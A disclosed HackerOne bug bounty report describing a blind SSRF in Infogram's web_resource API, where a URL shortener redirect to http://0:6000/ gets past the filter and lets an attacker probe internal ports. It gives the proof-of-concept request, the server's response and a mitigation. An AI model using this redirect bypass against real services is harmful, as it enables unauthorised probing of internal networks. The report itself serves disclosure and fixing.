# Internal Ports Scanning via Blind SSRF  (URL Redirection to beat filter)

## Report Details
- **Report ID**: 287496
- **URL**: https://hackerone.com/reports/287496
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-11-05T03:11:25.056Z
- **Disclosed**: 2017-11-08T14:14:33.919Z

## Reporter
- **Username**: spicyturtle
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
Summary
---------------------
This is a blind SSRF that lets you scan internal ports.

Technical Details
--------------------
Inspired by #281950, I found a way to evade the filter for the api endpoint `web_resource` by using a URL Redirection service.  I used tinyurl to create a url that linked to http://0:6000/ (any port would work here).    

Proof of Concept
----------
https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg

Response:
```
HTTP/1.1 200 OK
Date: Sun, 05 Nov 2017 02:42:03 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Server: nginx
Vary: Accept-Encoding
X-DNS-Prefetch-Control: off
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
X-Frame-Options: SAMEORIGIN
ETag: W/"fd-LAmakEWFfBZbQhSwn4nbeuTsy48"
X-Infogram-Server: b201
X-Infogram-Proxy: us
Content-Length: 253

[{"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.","url":"http://0:6000/"}]
```

I'm not sure if that tinyurl sticks around, but it's trivial to make another one using the information above.

Mitigation
--------------
Alter your filter so that it follows redirects until it lands on an actual URL, then check that URL.


## Attachments
No attachments
